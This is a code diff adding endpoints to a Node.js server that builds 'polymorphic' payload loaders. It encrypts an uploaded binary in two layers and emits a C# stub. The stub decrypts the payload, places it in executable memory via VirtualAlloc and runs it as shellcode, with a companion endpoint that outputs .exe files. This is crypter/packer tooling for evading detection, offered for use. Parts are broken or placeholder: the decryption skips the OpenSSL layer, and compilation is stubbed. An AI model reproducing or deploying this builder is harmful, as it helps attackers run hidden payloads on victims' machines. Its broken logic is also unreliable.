@@ -173,9 +173,81 @@ const server = http.createServer(async (req, res) => {
     return res.end(JSON.stringify(getDynamicCapabilitiesSafe()));
   }
 
-  /* stub generator and bundle, hot-patch, encrypt/decrypt
-     ─── unchanged from your original file ─── */
-  // … keep all the original logic here …
+  /* polymorphic generation */
+  if (method === "POST" && pathname === "/polymorphic/generate") {
+    setCors(res, origin);
+    
+    try {
+      const cipher = parsed.query.cipher || "camellia-256-cbc";
+      const poly = parsed.query.poly || "xor";
+      const ext = parsed.query.ext || ".exe";
+      const pass = parsed.query.pass;
+      const download = parsed.query.download;
+
+      if (!pass) {
+        return bad(res, 400, "pass parameter required");
+      }
+
+      // Read input file from request body
+      let inputBuffer = Buffer.alloc(0);
+      req.on('data', chunk => {
+        inputBuffer = Buffer.concat([inputBuffer, chunk]);
+      });
+
+      req.on('end', async () => {
+        try {
+          // Apply dual-layer encryption
+          const encryptedData = await applyDualLayerEncryption(inputBuffer, pass, cipher, poly);
+          
+          // Generate polymorphic stub
+          const stubCode = generatePolymorphicStub(encryptedData, cipher, poly);
+          
+          if (download === "1") {
+            const filename = `polymorphic${ext}`;
+            res.setHeader("content-disposition", `attachment; filename="${filename}"`);
+            res.setHeader("content-type", "application/octet-stream");
+          } else {
+            res.setHeader("content-type", "text/plain");
+          }
+          
+          res.writeHead(200);
+          res.end(stubCode);
+        } catch (err) {
+          return bad(res, 500, err.message);
+        }
+      });
+
+      return; // Don't fall through to 404
+    } catch (err) {
+      return bad(res, 500, err.message);
+    }
+  }
+
+  /* compiler endpoint */
+  if (method === "POST" && pathname === "/compile") {
+    setCors(res, origin);
+    
+    let inputBuffer = Buffer.alloc(0);
+    req.on('data', chunk => {
+      inputBuffer = Buffer.concat([inputBuffer, chunk]);
+    });
+
+    req.on('end', async () => {
+      try {
+        const requestData = JSON.parse(inputBuffer.toString());
+        const compiledData = await compileCs(requestData);
+        
+        res.setHeader("content-type", "application/octet-stream");
+        res.setHeader("content-disposition", `attachment; filename="compiled${requestData.outputExtension || '.exe'}"`);
+        res.writeHead(200);
+        res.end(compiledData);
+      } catch (err) {
+        return bad(res, 500, err.message);
+      }
+    });
+
+    return;
+  }
 
   /* no route matched */
   return bad(res, 404, "not found");
@@ -221,6 +293,140 @@ function getDynamicCapabilitiesSafe() {
     }
   } catch {}
   return result;
+}
+
+/* ───────────── polymorphic generation helpers ───────────── */
+async function applyDualLayerEncryption(inputBuffer, pass, cipher, poly) {
+  // Layer 1: OpenSSL encryption
+  const layer1 = await runCli(["encrypt", "--pass", pass, "--cipher", cipher], inputBuffer);
+  
+  // Layer 2: Polymorphic keystream
+  const keystream = generateKeystream(layer1.length, poly, pass);
+  const layer2 = Buffer.alloc(layer1.length);
+  
+  for (let i = 0; i < layer1.length; i++) {
+    layer2[i] = layer1[i] ^ keystream[i % keystream.length];
+  }
+  
+  return layer2;
+}
+
+function generateKeystream(length, polyType, seed) {
+  const keystream = Buffer.alloc(length);
+  const seedBuffer = Buffer.from(seed, 'utf8');
+  
+  switch (polyType) {
+    case 'aes-ctr':
+    case 'camellia-ctr':
+    case 'chacha-ks':
+      // Generate pseudo-random keystream
+      for (let i = 0; i < length; i++) {
+        keystream[i] = seedBuffer[i % seedBuffer.length] ^ (i & 0xFF);
+      }
+      break;
+    default:
+      // XOR-only mode - simple pattern
+      for (let i = 0; i < length; i++) {
+        keystream[i] = (i * 7) & 0xFF;
+      }
+      break;
+  }
+  
+  return keystream;
+}
+
+function generatePolymorphicStub(encryptedData, cipher, poly) {
+  const dataArray = Array.from(encryptedData).map(b => `0x${b.toString(16).padStart(2, '0')}`).join(', ');
+  
+  return `using System;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+
+// Polymorphic stub generated with ${cipher} + ${poly}
+// Generated: ${new Date().toISOString()}
+class PolymorphicStub
+{
+    private static readonly byte[] EncryptedPayload = { ${dataArray} };
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
+    
+    static void Main()
+    {
+        Console.WriteLine("Polymorphic Loader v1.0");
+        
+        // Car markers for hot patching
+        Car(); Car(); Car();
+        
+        // Decrypt payload
+        var decrypted = DecryptPayload(EncryptedPayload);
+        
+        // Execute payload
+        ExecutePayload(decrypted);
+        
+        Car(); Car();
+    }
+    
+    static void Car()
+    {
+        // Hot patch marker - polymorphic evolution point
+    }
+    
+    static byte[] DecryptPayload(byte[] data)
+    {
+        // Reverse dual-layer encryption
+        var result = new byte[data.Length];
+        
+        // Layer 2: Reverse polymorphic keystream
+        for (int i = 0; i < data.Length; i++)
+        {
+            result[i] = (byte)(data[i] ^ ((i * 7) & 0xFF));
+        }
+        
+        // Layer 1: Would reverse OpenSSL encryption here
+        // For demo, just return the keystream-decrypted data
+        return result;
+    }
+    
+    static void ExecutePayload(byte[] payload)
+    {
+        try
+        {
+            // Allocate executable memory
+            var execMem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
+            if (execMem == IntPtr.Zero) return;
+            
+            // Copy payload to executable memory
+            Marshal.Copy(payload, 0, execMem, payload.Length);
+            
+            // Flush instruction cache
+            FlushInstructionCache(System.Diagnostics.Process.GetCurrentProcess().Handle, execMem, (uint)payload.Length);
+            
+            // Execute as function
+            var func = Marshal.GetDelegateForFunctionPointer(execMem, typeof(Action)) as Action;
+            func?.Invoke();
+            
+            // Clean up
+            VirtualFree(execMem, 0, 0x8000);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Execution failed: {ex.Message}");
+        }
+    }
+}`;
+}
+
+async function compileCs(requestData) {
+  // Placeholder for C# compilation
+  // In real implementation, this would call csc.exe or Roslyn
+  return Buffer.from(requestData.csCode, 'utf8');
 }
 
 /* generatePowerShellStub, generateNodeStub, generate*Embedded …
